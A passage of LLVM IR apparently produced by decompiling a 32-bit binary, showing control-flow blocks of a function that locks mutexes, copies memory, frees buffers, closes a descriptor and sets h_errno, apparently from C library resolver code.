  store i32 %v4_8057bbf, i32* %eax.global-to-local, align 4
  %v0_8057bc4 = load i32, i32* @edi, align 4
  %v1_8057bc4 = add i32 %v0_8057bc4, 4
  %v2_8057bc4 = inttoptr i32 %v1_8057bc4 to i32*
  %v3_8057bc4 = load i32, i32* %v2_8057bc4, align 4
  store i32 %v3_8057bc4, i32* %eax.global-to-local, align 4
  %v0_8057bc7 = load i32, i32* @esp, align 4
  %v1_8057bc7 = add i32 %v0_8057bc7, 16
  %v9_8057bca = icmp eq i32 %v3_8057bc4, 24
  br i1 %v9_8057bca, label %dec_label_pc_8057b98.dec_label_pc_8057bf1_crit_edge, label %dec_label_pc_8057bcf

dec_label_pc_8057b98.dec_label_pc_8057bf1_crit_edge: ; preds = %dec_label_pc_8057b98
  %.pre24 = add i32 %v0_8057bc7, 260
  %.pre25 = inttoptr i32 %.pre24 to i32*
  %v4_8057bf1.pre = load i32, i32* %.pre25, align 4
  br label %dec_label_pc_8057bf1

dec_label_pc_8057bcf:                             ; preds = %dec_label_pc_8057b98
  %v1_8057bcf = add i32 %v0_8057bc4, 28
  %v2_8057bcf = inttoptr i32 %v1_8057bcf to i32*
  %v3_8057bcf = load i32, i32* %v2_8057bcf, align 4
  %v4_8057bcf = icmp eq i32 %v3_8057bcf, 0
  br i1 %v4_8057bcf, label %dec_label_pc_8057c8e, label %dec_label_pc_8057bd9

dec_label_pc_8057bd9:                             ; preds = %dec_label_pc_8057bcf
  %v1_8057bd9 = add i32 %v0_8057bc7, 260
  %v2_8057bd9 = inttoptr i32 %v1_8057bd9 to i32*
  %v3_8057bd9 = load i32, i32* %v2_8057bd9, align 4
  %v12_8057bd9 = icmp eq i32 %v3_8057bd9, 1
  br i1 %v12_8057bd9, label %dec_label_pc_8057bf1, label %dec_label_pc_8057be3

dec_label_pc_8057be3:                             ; preds = %dec_label_pc_8057bd9
  %v12_8057be3 = icmp eq i32 %v3_8057bd9, 28
  %v1_8057beb = icmp eq i1 %v12_8057be3, false
  br i1 %v1_8057beb, label %dec_label_pc_8057c8e, label %dec_label_pc_8057bf1

dec_label_pc_8057bf1:                             ; preds = %dec_label_pc_8057b98.dec_label_pc_8057bf1_crit_edge, %dec_label_pc_8057be3, %dec_label_pc_8057bd9
  %v4_8057bf1 = phi i32 [ %v4_8057bf1.pre, %dec_label_pc_8057b98.dec_label_pc_8057bf1_crit_edge ], [ %v3_8057bd9, %dec_label_pc_8057be3 ], [ %v3_8057bd9, %dec_label_pc_8057bd9 ]
  %v15_8057bf1 = icmp eq i32 %v3_8057bc4, %v4_8057bf1
  br i1 %v15_8057bf1, label %dec_label_pc_8057c06, label %dec_label_pc_8057bfa

dec_label_pc_8057bfa:                             ; preds = %dec_label_pc_8057bf1
  %v1_8057bfd = inttoptr i32 %v0_8057bc4 to i32*
  %v2_8057bfd = load i32, i32* %v1_8057bfd, align 4
  %v5_8057bfd = inttoptr i32 %v0_8057bc7 to i32*
  store i32 %v2_8057bfd, i32* %v5_8057bfd, align 4
  %v1_8057bff = call i32 @free(i32 -1)
  store i32 %v1_8057bff, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057c76

dec_label_pc_8057c06:                             ; preds = %dec_label_pc_8057bf1
  %v0_8057c06 = load i32, i32* @ebx, align 4
  %v1_8057c08 = sub i32 -1, %v0_8057c06
  store i32 %v1_8057c08, i32* %eax.global-to-local, align 4
  %v2_8057c0a = add i32 %v0_8057bc7, 120
  %v3_8057c0a = inttoptr i32 %v2_8057c0a to i32*
  %v4_8057c0a = load i32, i32* %v3_8057c0a, align 4
  %v5_8057c0a = add i32 %v4_8057c0a, %v1_8057c08
  store i32 %v5_8057c0a, i32* %eax.global-to-local, align 4
  %v2_8057c0e = add i32 %v0_8057bc4, 36
  %v3_8057c0e = inttoptr i32 %v2_8057c0e to i32*
  store i32 %v5_8057c0a, i32* %v3_8057c0e, align 4
  %v0_8057c11 = load i32, i32* @edi, align 4
  %v1_8057c11 = add i32 %v0_8057c11, 16
  %v2_8057c11 = inttoptr i32 %v1_8057c11 to i32*
  %v3_8057c11 = load i32, i32* %v2_8057c11, align 4
  %v1_8057c14 = add i32 %v3_8057c11, 4
  store i32 %v1_8057c14, i32* %eax.global-to-local, align 4
  %v2_8057c17 = add i32 %v0_8057c11, 36
  %v3_8057c17 = inttoptr i32 %v2_8057c17 to i32*
  %v4_8057c17 = load i32, i32* %v3_8057c17, align 4
  %v7_8057c17 = mul i32 %v4_8057c17, %v1_8057c14
  store i32 %v7_8057c17, i32* %eax.global-to-local, align 4
  %v2_8057c1b = add i32 %v0_8057c11, 32
  %v3_8057c1b = inttoptr i32 %v2_8057c1b to i32*
  %v4_8057c1b = load i32, i32* %v3_8057c1b, align 4
  %v6_8057c1e = icmp ugt i32 %v7_8057c17, %v4_8057c1b
  br i1 %v6_8057c1e, label %dec_label_pc_8057c06.dec_label_pc_8057c8e.loopexit_crit_edge, label %dec_label_pc_8057c20

dec_label_pc_8057c06.dec_label_pc_8057c8e.loopexit_crit_edge: ; preds = %dec_label_pc_8057c06
  %v0_8057c8e.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8057c8e

dec_label_pc_8057c20:                             ; preds = %dec_label_pc_8057c06
  store i32 0, i32* %v3_8057c17, align 4
  %v0_8057c27 = load i32, i32* @esp, align 4
  %v1_8057c27 = add i32 %v0_8057c27, 27
  %v2_8057c27 = inttoptr i32 %v1_8057c27 to i8*
  store i8 0, i8* %v2_8057c27, align 1
  %v1_8057c79.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8057c79

dec_label_pc_8057c2e:                             ; preds = %dec_label_pc_8057b8d
  %v1_8057c31 = add i32 %v0_8057b6e, 132
  %v2_8057c31 = inttoptr i32 %v1_8057c31 to i32*
  %v3_8057c31 = load i32, i32* %v2_8057c31, align 4
  %v6_8057c31 = inttoptr i32 %v0_8057b6e to i32*
  store i32 %v3_8057c31, i32* %v6_8057c31, align 4
  %v1_8057c38 = call i32 @free(i32 -1)
  store i32 %v1_8057c38, i32* %eax.global-to-local, align 4
  %v0_8057c3d = load i32, i32* @esp, align 4
  %v1_8057c3d = add i32 %v0_8057c3d, 16
  %v1_8057c40 = add i32 %v0_8057c3d, 260
  %v2_8057c40 = inttoptr i32 %v1_8057c40 to i32*
  %v3_8057c40 = load i32, i32* %v2_8057c40, align 4
  store i32 %v3_8057c40, i32* %eax.global-to-local, align 4
  %v1_8057c47 = add i32 %v0_8057c3d, 136
  %v2_8057c47 = inttoptr i32 %v1_8057c47 to i32*
  %v3_8057c47 = load i32, i32* %v2_8057c47, align 4
  %v15_8057c47 = icmp eq i32 %v3_8057c47, %v3_8057c40
  %v1_8057c4b = icmp eq i1 %v15_8057c47, false
  br i1 %v1_8057c4b, label %dec_label_pc_8057c79, label %dec_label_pc_8057c4d

dec_label_pc_8057c4d:                             ; preds = %dec_label_pc_8057c2e
  %v0_8057c4d = load i32, i32* @edi, align 4
  %v1_8057c4d = add i32 %v0_8057c4d, 16
  %v2_8057c4d = inttoptr i32 %v1_8057c4d to i32*
  %v3_8057c4d = load i32, i32* %v2_8057c4d, align 4
  store i32 %v3_8057c4d, i32* %eax.global-to-local, align 4
  %v2_8057c50 = add i32 %v0_8057c3d, 148
  %v3_8057c50 = inttoptr i32 %v2_8057c50 to i32*
  %v4_8057c50 = load i32, i32* %v3_8057c50, align 4
  %v15_8057c50 = icmp eq i32 %v3_8057c4d, %v4_8057c50
  %v1_8057c57 = icmp eq i1 %v15_8057c50, false
  br i1 %v1_8057c57, label %dec_label_pc_8057d13, label %dec_label_pc_8057c5d

dec_label_pc_8057c5d:                             ; preds = %dec_label_pc_8057c4d
  %v0_8057c5d = load i32, i32* @edx, align 4
  %v2_8057c5d = add i32 %v0_8057c3d, 12
  %v3_8057c5d = inttoptr i32 %v2_8057c5d to i32*
  store i32 %v0_8057c5d, i32* %v3_8057c5d, align 4
  %v0_8057c5e = load i32, i32* %eax.global-to-local, align 4
  %v2_8057c5e = add i32 %v0_8057c3d, 8
  %v3_8057c5e = inttoptr i32 %v2_8057c5e to i32*
  store i32 %v0_8057c5e, i32* %v3_8057c5e, align 4
  %v1_8057c5f = add i32 %v0_8057c3d, 152
  %v2_8057c5f = inttoptr i32 %v1_8057c5f to i32*
  %v3_8057c5f = load i32, i32* %v2_8057c5f, align 4
  %v5_8057c5f = add i32 %v0_8057c3d, 4
  %v6_8057c5f = inttoptr i32 %v5_8057c5f to i32*
  store i32 %v3_8057c5f, i32* %v6_8057c5f, align 4
  %v0_8057c66 = load i32, i32* %eax.global-to-local, align 4
  %v1_8057c66 = load i32, i32* @edi, align 4
  %v2_8057c66 = add i32 %v1_8057c66, 36
  %v3_8057c66 = inttoptr i32 %v2_8057c66 to i32*
  %v4_8057c66 = load i32, i32* %v3_8057c66, align 4
  %v7_8057c66 = mul i32 %v4_8057c66, %v0_8057c66
  store i32 %v7_8057c66, i32* %eax.global-to-local, align 4
  %v2_8057c6a = add i32 %v1_8057c66, 28
  %v3_8057c6a = inttoptr i32 %v2_8057c6a to i32*
  %v4_8057c6a = load i32, i32* %v3_8057c6a, align 4
  %v5_8057c6a = add i32 %v4_8057c6a, %v7_8057c66
  store i32 %v5_8057c6a, i32* %eax.global-to-local, align 4
  %v3_8057c6d = inttoptr i32 %v0_8057c3d to i32*
  store i32 %v5_8057c6a, i32* %v3_8057c6d, align 4
  %v4_8057c6e = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_80577ac, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8057c6e, i32* %eax.global-to-local, align 4
  %v0_8057c73 = load i32, i32* @edi, align 4
  %v1_8057c73 = add i32 %v0_8057c73, 36
  %v2_8057c73 = inttoptr i32 %v1_8057c73 to i32*
  %v3_8057c73 = load i32, i32* %v2_8057c73, align 4
  %v4_8057c73 = add i32 %v3_8057c73, 1
  store i32 %v4_8057c73, i32* %v2_8057c73, align 4
  br label %dec_label_pc_8057c76

dec_label_pc_8057c76:                             ; preds = %dec_label_pc_8057bfa, %dec_label_pc_8057c5d
  %v0_8057c76 = load i32, i32* @esp, align 4
  %v1_8057c76 = add i32 %v0_8057c76, 16
  br label %dec_label_pc_8057c79

dec_label_pc_8057c79:                             ; preds = %dec_label_pc_8057c2e, %dec_label_pc_8057c20, %dec_label_pc_8057c76
  %v1_8057c79 = phi i32 [ %v1_8057c3d, %dec_label_pc_8057c2e ], [ %v1_8057c79.pre, %dec_label_pc_8057c20 ], [ %v1_8057c76, %dec_label_pc_8057c76 ]
  %v0_8057c79 = load i32, i32* @esi, align 4
  %v2_8057c79 = add i32 %v1_8057c79, 52
  %v3_8057c79 = inttoptr i32 %v2_8057c79 to i32*
  %v4_8057c79 = load i32, i32* %v3_8057c79, align 4
  %v5_8057c79 = add i32 %v4_8057c79, %v0_8057c79
  store i32 %v5_8057c79, i32* @esi, align 4
  %v0_8057c7d = load i32, i32* @ebx, align 4
  %v1_8057c7d = add i32 %v0_8057c7d, 1
  store i32 %v1_8057c7d, i32* @ebx, align 4
  %v2_8057c7e = add i32 %v1_8057c79, 104
  %v3_8057c7e = inttoptr i32 %v2_8057c7e to i32*
  %v4_8057c7e = load i32, i32* %v3_8057c7e, align 4
  %v5_8057c7e = sub i32 %v1_8057c7d, %v4_8057c7e
  %v11_8057c7e = xor i32 %v4_8057c7e, %v1_8057c7d
  %v12_8057c7e = xor i32 %v5_8057c7e, %v1_8057c7d
  %v13_8057c7e = and i32 %v12_8057c7e, %v11_8057c7e
  %v14_8057c7e = icmp slt i32 %v13_8057c7e, 0
  %v16_8057c7e = icmp slt i32 %v5_8057c7e, 0
  %v2_8057c82 = icmp eq i1 %v16_8057c7e, %v14_8057c7e
  br i1 %v2_8057c82, label %dec_label_pc_8057c8e, label %dec_label_pc_8057c84

dec_label_pc_8057c84:                             ; preds = %dec_label_pc_8057c84.lr.ph, %dec_label_pc_8057c79
  %v0_8057c84 = phi i32 [ %v0_8057c84.pre, %dec_label_pc_8057c84.lr.ph ], [ %v5_8057c79, %dec_label_pc_8057c79 ]
  %v0_8057b5a67 = phi i32 [ %v1_8057c7e.pre, %dec_label_pc_8057c84.lr.ph ], [ %v1_8057c79, %dec_label_pc_8057c79 ]
  %v2_8057c84 = add i32 %v0_8057b5a67, 16
  %v3_8057c84 = inttoptr i32 %v2_8057c84 to i32*
  %v4_8057c84 = load i32, i32* %v3_8057c84, align 4
  %v5_8057c84 = sub i32 %v0_8057c84, %v4_8057c84
  %v11_8057c84 = xor i32 %v4_8057c84, %v0_8057c84
  %v12_8057c84 = xor i32 %v5_8057c84, %v0_8057c84
  %v13_8057c84 = and i32 %v12_8057c84, %v11_8057c84
  %v14_8057c84 = icmp slt i32 %v13_8057c84, 0
  %v16_8057c84 = icmp slt i32 %v5_8057c84, 0
  %v2_8057c88 = icmp eq i1 %v16_8057c84, %v14_8057c84
  br i1 %v2_8057c88, label %dec_label_pc_8057c8e, label %dec_label_pc_8057b5a

dec_label_pc_8057c8e:                             ; preds = %dec_label_pc_8057b7d, %dec_label_pc_8057b4e, %dec_label_pc_8057c79, %dec_label_pc_8057bcf, %dec_label_pc_8057be3, %dec_label_pc_8057c84, %dec_label_pc_8057c06.dec_label_pc_8057c8e.loopexit_crit_edge
  %v0_8057c8e = phi i32 [ %v0_8057c8e.pre.pre, %dec_label_pc_8057c06.dec_label_pc_8057c8e.loopexit_crit_edge ], [ %v1_8057c7e.pre, %dec_label_pc_8057b4e ], [ %v1_8057c79, %dec_label_pc_8057c79 ], [ %v1_8057bc7, %dec_label_pc_8057bcf ], [ %v1_8057bc7, %dec_label_pc_8057be3 ], [ %v0_8057b5a67, %dec_label_pc_8057c84 ], [ %v1_8057b6e, %dec_label_pc_8057b7d ]
  %v1_8057c91 = add i32 %v0_8057c8e, 20
  %v2_8057c91 = inttoptr i32 %v1_8057c91 to i32*
  %v3_8057c91 = load i32, i32* %v2_8057c91, align 4
  %v5_8057c91 = add i32 %v0_8057c8e, -16
  %v6_8057c91 = inttoptr i32 %v5_8057c91 to i32*
  store i32 %v3_8057c91, i32* %v6_8057c91, align 4
  %v1_8057c95 = call i32 @__libc_close(i32 -1)
  store i32 %v1_8057c95, i32* %eax.global-to-local, align 4
  %v0_8057c9a = load i32, i32* @esp, align 4
  %v1_8057c9d = add i32 %v0_8057c9a, 272
  %v2_8057c9d = inttoptr i32 %v1_8057c9d to i32*
  %v3_8057c9d = load i32, i32* %v2_8057c9d, align 4
  %v4_8057c9d = icmp eq i32 %v3_8057c9d, 0
  br i1 %v4_8057c9d, label %dec_label_pc_8057cb2, label %dec_label_pc_8057ca7

dec_label_pc_8057ca7:                             ; preds = %dec_label_pc_8057c8e
  store i32 %v3_8057c9d, i32* %edx.global-to-local, align 4
  %v2_8057cae = inttoptr i32 %v3_8057c9d to i32*
  store i32 %v2_805771e, i32* %v2_8057cae, align 4
  %v0_8057cbe.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8057cbe

dec_label_pc_8057cb2:                             ; preds = %dec_label_pc_8057c8e
  %v3_8057cb5 = inttoptr i32 %v0_8057c9a to i32*
  store i32 %v2_805771e, i32* %v3_8057cb5, align 4
  %v1_8057cb6 = call i32 @free(i32 -1)
  store i32 %v1_8057cb6, i32* %eax.global-to-local, align 4
  %v0_8057cbb = load i32, i32* @esp, align 4
  %v1_8057cbb = add i32 %v0_8057cbb, 16
  br label %dec_label_pc_8057cbe

dec_label_pc_8057cbe:                             ; preds = %dec_label_pc_8057ca7, %dec_label_pc_8057cb2
  %v0_8057cbe = phi i32 [ %v0_8057cbe.pre, %dec_label_pc_8057ca7 ], [ %v1_8057cbb, %dec_label_pc_8057cb2 ]
  %v1_8057cc1 = add i32 %v0_8057cbe, 12
  %v2_8057cc1 = inttoptr i32 %v1_8057cc1 to i32*
  %v3_8057cc1 = load i32, i32* %v2_8057cc1, align 4
  %v5_8057cc1 = add i32 %v0_8057cbe, -16
  %v6_8057cc1 = inttoptr i32 %v5_8057cc1 to i32*
  store i32 %v3_8057cc1, i32* %v6_8057cc1, align 4
  %v1_8057cc5 = call i32 @free(i32 -1)
  store i32 %v1_8057cc5, i32* %eax.global-to-local, align 4
  %v0_8057cca = load i32, i32* @esp, align 4
  %v1_8057ccd = add i32 %v0_8057cca, 8
  %v2_8057ccd = inttoptr i32 %v1_8057ccd to i32*
  store i32 ptrtoint (i8** @global_var_8067780.314 to i32), i32* %v2_8057ccd, align 4
  %v1_8057cd2 = add i32 %v0_8057cca, 4
  %v2_8057cd2 = inttoptr i32 %v1_8057cd2 to i32*
  store i32 134541533, i32* %v2_8057cd2, align 4
  %v1_8057cd7 = add i32 %v0_8057cca, 200
  store i32 %v1_8057cd7, i32* @ebx, align 4
  %v3_8057cde = inttoptr i32 %v0_8057cca to i32*
  store i32 %v1_8057cd7, i32* %v3_8057cde, align 4
  %v4_8057cdf = call i32 @__pthread_cleanup_push_defer(i32* inttoptr (i32 -1 to i32*), i32 %v15_80577ac, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8057cdf, i32* %eax.global-to-local, align 4
  %v0_8057ce4 = load i32, i32* @esp, align 4
  %v1_8057ce4 = inttoptr i32 %v0_8057ce4 to i32*
  store i32 ptrtoint (i8** @global_var_8067780.314 to i32), i32* %v1_8057ce4, align 4
  %v1_8057ceb = call i32 @pthread_mutex_lock(i32 -1)
  store i32 %v1_8057ceb, i32* %eax.global-to-local, align 4
  %v0_8057cf0 = load i32, i32* @esp, align 4
  %v1_8057cf0 = add i32 %v0_8057cf0, 56
  %v2_8057cf0 = inttoptr i32 %v1_8057cf0 to i32*
  %v3_8057cf0 = load i32, i32* %v2_8057cf0, align 4
  store i32 %v3_8057cf0, i32* %eax.global-to-local, align 4
  %v1_8057cf4 = add i32 %v0_8057cf0, 60
  %v2_8057cf4 = inttoptr i32 %v1_8057cf4 to i32*
  %v3_8057cf4 = load i32, i32* %v2_8057cf4, align 4
  store i32 %v3_8057cf4, i32* %edx.global-to-local, align 4
  %v1_8057cf8 = inttoptr i32 %v0_8057cf0 to i32*
  %v3_8057cf8 = add i32 %v0_8057cf0, 4
  %v1_8057cf9 = inttoptr i32 %v3_8057cf8 to i32*
  %v2_8057cf9 = load i32, i32* %v1_8057cf9, align 4
  store i32 %v2_8057cf9, i32* @edi, align 4
  %v1_8057cfa = sext i32 %v3_8057cf0 to i64
  store i64 %v1_8057cfa, i64* @global_var_8067798.315, align 8
  %v1_8057cff = trunc i32 %v3_8057cf4 to i16
  store i16 %v1_8057cff, i16* @global_var_8062de4.316, align 4
  store i32 1, i32* %v1_8057cf9, align 4
  %v0_8057d08 = load i32, i32* @ebx, align 4
  store i32 %v0_8057d08, i32* %v1_8057cf8, align 4
  %v3_8057d09 = call i32 @__pthread_cleanup_pop_restore(i32* inttoptr (i32 -1 to i32*), i32 %v15_80577ac)
  store i32 %v3_8057d09, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057e4a

dec_label_pc_8057d13:                             ; preds = %dec_label_pc_8057c4d
  %v1_8057d16 = inttoptr i32 %v0_8057c4d to i32*
  %v2_8057d16 = load i32, i32* %v1_8057d16, align 4
  %v5_8057d16 = inttoptr i32 %v0_8057c3d to i32*
  store i32 %v2_8057d16, i32* %v5_8057d16, align 4
  %v1_8057d18 = call i32 @free(i32 -1)
  store i32 %v1_8057d18, i32* %eax.global-to-local, align 4
  %v0_8057d1d = load i32, i32* @esp, align 4
  %v1_8057d1d = add i32 %v0_8057d1d, 16
  br label %dec_label_pc_8057d20

dec_label_pc_8057d20:                             ; preds = %dec_label_pc_8057a52, %dec_label_pc_8057b7d, %dec_label_pc_8057b75, %dec_label_pc_8057b11, %dec_label_pc_8057a97, %dec_label_pc_8057a73, %dec_label_pc_8057d13
  %v1_8057d27 = phi i32 [ %v1_8057a67, %dec_label_pc_8057a52 ], [ %v1_8057b6e, %dec_label_pc_8057b7d ], [ %v1_8057b6e, %dec_label_pc_8057b75 ], [ %v1_8057a88, %dec_label_pc_8057b11 ], [ %v1_8057a88, %dec_label_pc_8057a97 ], [ %v1_8057a88, %dec_label_pc_8057a73 ], [ %v1_8057d1d, %dec_label_pc_8057d13 ]
  %v1_8057d20 = add i32 %v1_8057d27, 51
  %v2_8057d20 = inttoptr i32 %v1_8057d20 to i8*
  %v3_8057d20 = load i8, i8* %v2_8057d20, align 1
  %v4_8057d20 = icmp eq i8 %v3_8057d20, 0
  %v1_8057d25 = icmp eq i1 %v4_8057d20, false
  br i1 %v1_8057d25, label %dec_label_pc_8057d6b, label %dec_label_pc_8057d27

dec_label_pc_8057d27:                             ; preds = %dec_label_pc_8057d20
  %v0_8057d27 = load i32, i32* @ecx, align 4
  %v2_8057d27 = add i32 %v1_8057d27, -4
  %v3_8057d27 = inttoptr i32 %v2_8057d27 to i32*
  store i32 %v0_8057d27, i32* %v3_8057d27, align 4
  %v1_8057d28 = add i32 %v1_8057d27, -8
  %v2_8057d28 = inttoptr i32 %v1_8057d28 to i32*
  store i32 ptrtoint (i32* @global_var_8062de8.231 to i32), i32* %v2_8057d28, align 4
  %v1_8057d2d = add i32 %v1_8057d27, -12
  %v2_8057d2d = inttoptr i32 %v1_8057d2d to i32*
  store i32 134541533, i32* %v2_8057d2d, align 4
  %v1_8057d32 = add i32 %v1_8057d27, 184
  store i32 %v1_8057d32, i32* @esi, align 4
  %v2_8057d39 = add i32 %v1_8057d27, -16
  %v3_8057d39 = inttoptr i32 %v2_8057d39 to i32*
  store i32 %v1_8057d32, i32* %v3_8057d39, align 4
  %v4_8057d3a = call i32 @__pthread_cleanup_push_defer(i32* inttoptr (i32 -1 to i32*), i32 %v15_80577ac, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8057d3a, i32* %eax.global-to-local, align 4
  %v0_8057d3f = load i32, i32* @esp, align 4
  %v1_8057d3f = inttoptr i32 %v0_8057d3f to i32*
  store i32 ptrtoint (i32* @global_var_8062de8.231 to i32), i32* %v1_8057d3f, align 4
  %v1_8057d46 = call i32 @pthread_mutex_lock(i32 -1)
  store i32 %v1_8057d46, i32* %eax.global-to-local, align 4
  %v0_8057d4b = load i32, i32* @global_var_8067e64.317, align 4
  %v0_8057d51 = load i32, i32* @esp, align 4
  %v1_8057d51 = inttoptr i32 %v0_8057d51 to i32*
  %v2_8057d51 = load i32, i32* %v1_8057d51, align 4
  store i32 %v2_8057d51, i32* %eax.global-to-local, align 4
  %v3_8057d51 = add i32 %v0_8057d51, 4
  %v1_8057d52 = inttoptr i32 %v3_8057d51 to i32*
  %v2_8057d52 = load i32, i32* %v1_8057d52, align 4
  store i32 %v2_8057d52, i32* %edx.global-to-local, align 4
  %v1_8057d53 = add i32 %v0_8057d4b, -1
  store i32 %v1_8057d53, i32* @ebx, align 4
  store i32 1, i32* %v1_8057d52, align 4
  %v0_8057d56 = load i32, i32* @esi, align 4
  store i32 %v0_8057d56, i32* %v1_8057d51, align 4
  %v3_8057d57 = call i32 @__pthread_cleanup_pop_restore(i32* inttoptr (i32 -1 to i32*), i32 %v15_80577ac)
  store i32 %v3_8057d57, i32* %eax.global-to-local, align 4
  %v0_8057d5c = load i32, i32* @esp, align 4
  %v1_8057d5c = add i32 %v0_8057d5c, 16
  %v1_8057d5f = add i32 %v0_8057d5c, 52
  %v2_8057d5f = inttoptr i32 %v1_8057d5f to i32*
  %v3_8057d5f = load i32, i32* %v2_8057d5f, align 4
  %v4_8057d5f = load i32, i32* @ebx, align 4
  %v5_8057d5f = sub i32 %v3_8057d5f, %v4_8057d5f
  %v11_8057d5f = xor i32 %v4_8057d5f, %v3_8057d5f
  %v12_8057d5f = xor i32 %v5_8057d5f, %v3_8057d5f
  %v13_8057d5f = and i32 %v12_8057d5f, %v11_8057d5f
  %v14_8057d5f = icmp slt i32 %v13_8057d5f, 0
  %v16_8057d5f = icmp slt i32 %v5_8057d5f, 0
  %v2_8057d63 = icmp eq i1 %v16_8057d5f, %v14_8057d5f
  br i1 %v2_8057d63, label %dec_label_pc_8057d6b, label %dec_label_pc_8057d65

dec_label_pc_8057d65:                             ; preds = %dec_label_pc_8057d27
  %v4_8057d65 = add i32 %v3_8057d5f, 1
  store i32 %v4_8057d65, i32* %v2_8057d5f, align 4
  br label %dec_label_pc_8057d8c.backedge

dec_label_pc_8057d6b:                             ; preds = %dec_label_pc_80579f4, %dec_label_pc_8057d27, %dec_label_pc_8057d20, %dec_label_pc_8057a0b
  %v1_8057d7a = phi i32 [ %v1_8057d5c, %dec_label_pc_8057d27 ], [ %v1_8057d27, %dec_label_pc_8057d20 ], [ %v1_8057a47, %dec_label_pc_8057a0b ], [ %v0_8057d6b.pre, %dec_label_pc_80579f4 ]
  %v1_8057d6b = add i32 %v1_8057d7a, 40
  %v2_8057d6b = inttoptr i32 %v1_8057d6b to i32*
  %v3_8057d6b = load i32, i32* %v2_8057d6b, align 4
  %v1_8057d6f = add i32 %v3_8057d6b, 1
  store i32 %v1_8057d6f, i32* %eax.global-to-local, align 4
  %v1_8057d70 = ashr i32 %v1_8057d6f, 31
  store i32 %v1_8057d70, i32* %edx.global-to-local, align 4
  %v1_8057d71 = add i32 %v1_8057d7a, 248
  %v2_8057d71 = inttoptr i32 %v1_8057d71 to i32*
  %v3_8057d71 = load i32, i32* %v2_8057d71, align 4
  %v5_8057d71 = zext i32 %v1_8057d6f to i64
  %v7_8057d71 = zext i32 %v1_8057d70 to i64
  %v8_8057d71 = mul nuw i64 %v7_8057d71, 4294967296
  %v9_8057d71 = or i64 %v8_8057d71, %v5_8057d71
  %v10_8057d71 = zext i32 %v3_8057d71 to i64
  %v11_8057d71 = sdiv i64 %v9_8057d71, %v10_8057d71
  %v12_8057d71 = trunc i64 %v11_8057d71 to i32
  store i32 %v12_8057d71, i32* %eax.global-to-local, align 4
  %v13_8057d71 = srem i64 %v9_8057d71, %v10_8057d71
  %v14_8057d71 = trunc i64 %v13_8057d71 to i32
  store i32 %v14_8057d71, i32* %edx.global-to-local, align 4
  %v1_8057d78 = icmp eq i32 %v14_8057d71, 0
  store i32 %v14_8057d71, i32* %v2_8057d6b, align 4
  %v1_8057d7e = icmp eq i1 %v1_8057d78, false
  br i1 %v1_8057d7e, label %dec_label_pc_8057d84, label %dec_label_pc_8057d80

dec_label_pc_8057d80:                             ; preds = %dec_label_pc_8057d6b
  %v0_8057d80 = load i32, i32* @esp, align 4
  %v1_8057d80 = add i32 %v0_8057d80, 28
  %v2_8057d80 = inttoptr i32 %v1_8057d80 to i32*
  %v3_8057d80 = load i32, i32* %v2_8057d80, align 4
  %v4_8057d80 = add i32 %v3_8057d80, 1
  store i32 %v4_8057d80, i32* %v2_8057d80, align 4
  br label %dec_label_pc_8057d84

dec_label_pc_8057d84:                             ; preds = %dec_label_pc_8057d6b, %dec_label_pc_8057d80
  %v0_8057d84 = load i32, i32* @esp, align 4
  %v1_8057d84 = add i32 %v0_8057d84, 36
  %v2_8057d84 = inttoptr i32 %v1_8057d84 to i32*
  store i32 -1, i32* %v2_8057d84, align 4
  br label %dec_label_pc_8057d8c.backedge

dec_label_pc_8057d8c.backedge:                    ; preds = %dec_label_pc_8057d84, %dec_label_pc_8057a02, %dec_label_pc_8057af0, %dec_label_pc_8057d65
  %v0_8057d8c.pre = load i32, i32* @esp, align 4
  %v1_8057d8c = add i32 %v0_8057d8c.pre, 28
  %v2_8057d8c = inttoptr i32 %v1_8057d8c to i32*
  %v3_8057d8c = load i32, i32* %v2_8057d8c, align 4
  %tmp110 = icmp ult i32 %v3_8057d8c, 3
  br i1 %tmp110, label %dec_label_pc_80577ec, label %dec_label_pc_8057db1

dec_label_pc_8057db1:                             ; preds = %dec_label_pc_8057766, %dec_label_pc_8057802, %dec_label_pc_80578f6, %dec_label_pc_8057d8c.backedge, %entry, %dec_label_pc_8057740, %dec_label_pc_8057748, %dec_label_pc_8057756
  %stack_var_-180.0 = phi i16 [ -1, %dec_label_pc_8057756 ], [ -1, %dec_label_pc_8057748 ], [ -1, %dec_label_pc_8057740 ], [ -1, %entry ], [ %v0_80577b3, %dec_label_pc_8057d8c.backedge ], [ %v0_80577b3, %dec_label_pc_80578f6 ], [ %v0_80577b3, %dec_label_pc_8057802 ], [ %v0_80577b3, %dec_label_pc_8057766 ]
  %v0_8057db1 = call i32 @__GI___h_errno_location()
  store i32 %v0_8057db1, i32* %eax.global-to-local, align 4
  %v1_8057db6 = inttoptr i32 %v0_8057db1 to i32*
  store i32 -1, i32* %v1_8057db6, align 4
  %v0_8057dbc = load i32, i32* @esp, align 4
  %v1_8057dbc = add i32 %v0_8057dbc, 56
  %v2_8057dbc = inttoptr i32 %v1_8057dbc to i32*
  %v3_8057dbc = load i32, i32* %v2_8057dbc, align 4
  store i32 %v3_8057dbc, i32* %eax.global-to-local, align 4
  %v2_8057dc0 = add i32 %v0_8057dbc, 44
  %v3_8057dc0 = inttoptr i32 %v2_8057dc0 to i32*
  store i32 %v3_8057dbc, i32* %v3_8057dc0, align 4
  br label %dec_label_pc_8057dc4

dec_label_pc_8057dc4:                             ; preds = %dec_label_pc_8057b29, %dec_label_pc_8057b01, %dec_label_pc_8057db1
  %stack_var_-180.1 = phi i16 [ %stack_var_-180.0, %dec_label_pc_8057db1 ], [ %v0_80577b3, %dec_label_pc_8057b29 ], [ %v0_80577b3, %dec_label_pc_8057b01 ]
  %v0_8057dc4 = load i32, i32* @esp, align 4
  %v1_8057dc4 = add i32 %v0_8057dc4, 20
  %v2_8057dc4 = inttoptr i32 %v1_8057dc4 to i32*
  %v3_8057dc4 = load i32, i32* %v2_8057dc4, align 4
  %v13_8057dc4 = icmp eq i32 %v3_8057dc4, -1
